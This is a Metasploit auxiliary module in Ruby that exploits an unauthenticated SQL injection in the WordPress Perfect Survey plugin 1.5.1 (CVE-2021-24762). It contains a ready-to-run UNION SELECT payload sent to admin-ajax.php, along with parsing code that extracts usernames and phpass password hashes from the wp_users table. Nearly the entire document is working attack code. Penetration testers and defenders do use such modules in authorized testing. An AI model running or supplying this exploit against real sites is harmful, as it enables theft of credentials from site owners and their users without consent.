##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'json'

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'WordPress Plugin Perfect Survey 1.5.1 SQLi (Unauthenticated)',
        'Description' => %q{
          This module exploits a SQL injection vulnerability in the Perfect Survey
          plugin for WordPress (version 1.5.1). An unauthenticated attacker can
          exploit the SQLi to retrieve sensitive information such as usernames
          and password hashes from the `wp_users` table.
        },
        'Author' => [
          'Aaryan Golatkar', # Metasploit Module Creator
          'Ron Jost'         # Vulnerability discovery
        ],
        'License' => MSF_LICENSE,
        'References' => [
          ['EDB', '50766'],
          ['CVE', '2021-24762']
        ],
        'DisclosureDate' => '2021-10-05',
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'SideEffects' => [IOC_IN_LOGS],
          'Reliability' => []
        }
      )
    )

    register_options([
      OptString.new('TARGETURI', [true, 'Base path to the WordPress installation', '/']),
      OptBool.new('SHOW_FULL_RESPONSE', [false, 'Show the entire JSON response if username and password hash are not extracted', false]),
      Opt::RPORT(80) # Default port for HTTP
    ])
  end

  def run
    print_status('Exploiting SQLi in Perfect Survey plugin...')

    # The vulnerable endpoint
    endpoint = normalize_uri(target_uri.path, 'wp-admin', 'admin-ajax.php')

    # SQL injection payload
    sqli_payload = '1 union select 1,1,char(116,101,120,116),user_login,user_pass,0,0,null,null,null,null,null,null,null,null,null from wp_users'

    # HTTP GET request parameters
    params = {
      'action' => 'get_question',
      'question_id' => sqli_payload
    }

    # Send the request
    res = send_request_cgi({
      'uri' => endpoint,
      'method' => 'GET',
      'vars_get' => params
    })

    if res && res.code == 200
      print_good('Received a response from the server!')

      begin
        # Parse response body as JSON
        json_response = JSON.parse(res.body)

        # Extract 'html' field from JSON
        html_content = json_response['html']

        # Extract username
        username = extract_between(html_content, 'placeholder="Insert a question - Required" value="', '"')
        # Extract password hash starting with $P$
        password_hash = extract_password_hash(html_content)

        if username
          print_good("Extracted Username: #{username}")
        else
          print_error('Could not extract username from the response.')
        end

        if password_hash
          print_good("Extracted Password Hash: #{password_hash}")
        else
          print_error('Could not extract password hash from the response.')
        end

        print_line('Try setting the SHOW_FULL_RESPONSE variable.') if !username && !password_hash

        # Show full response if extraction fails and the option is enabled
        if datastore['SHOW_FULL_RESPONSE']
          print_status("Full Response (HTML):\n#{html_content}")
        end
      rescue JSON::ParserError => e
        print_error("Failed to parse response as JSON: #{e.message}")
      end
    else
      print_error('No response or unexpected HTTP status code!')
    end
  end

  # Helper function to extract substring between two markers
  def extract_between(string, start_marker, end_marker)
    start_index = string.index(start_marker)
    return nil unless start_index

    start_index += start_marker.length
    end_index = string.index(end_marker, start_index)
    return nil unless end_index

    string[start_index...end_index]
  end

  # Helper function to extract a password hash starting with '$P$'
  def extract_password_hash(string)
    start_index = string.index('$P$')
    return nil unless start_index

    # Assume the password hash ends at the first whitespace or quote
    end_index = string.index(/\s|"/, start_index)
    end_index ||= string.length # If no end marker found, go to the end of the string

    string[start_index...end_index]
  end
end
